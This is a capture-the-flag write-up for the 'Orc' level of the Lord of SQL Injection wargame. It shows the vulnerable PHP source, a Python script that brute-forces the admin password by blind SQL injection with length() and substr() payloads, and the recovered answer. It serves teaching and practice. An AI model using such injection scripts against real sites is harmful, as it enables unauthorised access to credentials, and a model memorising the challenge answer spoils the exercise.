#Lord Of SQL Injection

###Orc

[Orc chall link](https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php)

Source code of this chall:
<pre>
    <code>
    	<?php 
  	  include "./config.php"; 
	  login_chk(); 
	  dbconnect(); 
	  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
	  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
	  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
	  $result = @mysql_fetch_array(mysql_query($query)); 
	  if($result['id']) echo "<h2>Hello admin</h2>"; 
	  $_GET[pw] = addslashes($_GET[pw]); 
	  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
	  $result = @mysql_fetch_array(mysql_query($query)); 
	  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
	  highlight_file(__FILE__); 
	?>
    </code>
</pre>

In this chall, your object is to find the password because i already used many commnand like `' or 1=1 -- ;` and get no response :( . After many times trying, i try Blind SQL Injection and get the thing i want. You will bruteforce to find every character of the password.


You can devide this chall into 2 phase:
1. Find the length of the password
2. Find every character of the password

This is my code to solve this problem:
<pre>
    <code>
    	import requests
	import string

	url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
	my_cookies = {"PHPSESSID":"your PHPSESSID here"}
	passwd = ""
	passwdlen = 0
	for i in range(0,10):
	    print("Checking if the password length is " + str(i))
	    payload = "' or id='admin' and length(pw)=" + str(i) + " -- ;"
	    payload = requests.utils.quote(payload)
	    final_url = url + payload
	    res = requests.get(final_url,cookies=my_cookies)
	    if "Hello admin" in res.text:
		print("FOUND! Password length is " + str(i))
		print("-------------------------------------------------")
		passwdlen = i
		break
	    else:
		print("FAIL!")
		print("-------------------------------------------------")



	for i in range(1,passwdlen+1):
	    for c in string.digits + string.ascii_lowercase:
		payload = "'or id='admin' and substr(pw,"+str(i)+",1)='" +c+ "' -- ;"
		payload = requests.utils.quote(payload)
		final_url = url + payload
		res = requests.get(final_url,cookies=my_cookies)
		if "Hello admin" in res.text:
		    passwd+=c
		    print(final_url)
		    print("Found a new char of password: " + passwd)
		    break
	print("The password is: " + passwd)
    </code>
</pre>

The two library which i used in this code is requests library and string library. The requests library is used to send data to the server, and the string library to get all the digit and lowercase letter as string for the second loop. Maybe you don't understand why i didn't use the uppercase letter or why the range of the first loop is 0->10, that's a secret :) You will know that secret after you solved this chall :D

In the first for loop, i find the password length. After that, i use the password's length i had found before as an end of range for the second for loop. And also, in this chall you must use you cookies to pass into the header of the request you make. If you didn't do that, this code will fall because the server will redirect you to the login page :<

I will explain two payload i used in this chall:

1. The first loop payload

<pre>
    <code>
    	url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=' or id='admin' and length(pw)=" + str(i) + " -- ;"
    </code>
</pre>

I find the password by using a single quote to end the query which already open in the query of the program. Then i find the length of the `pw` parameter by loop through a range from 0 to 10. If the length of the `pw` is correct, the line "Hello admin" will appear. You can rely on that line to bruteforce the length of the password. And please remember that after ` --` is a space and a ";" symbol. Because in MySQL, after a comment you must leave a space, but if you leave only the space with no character after that space, the space will be cut off automatically so i choose a ";" symbol, you can choose whatever you want, just make sure the space after the comment exist.

2. The second loop payload

<pre>
    <code>
	url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=' or id='admin' and substr(pw,"+ str(i) +",1)='" +c+ "' -- ;"
    </code>
</pre>

In the second loop, i find every character of the password using bruteforce again. The substr() function will extract a substring from a string, in this case is the passwd. You can read about the substr() function on the internet to know more about how it work. 

And after two loop, you can find the password is 095a9852
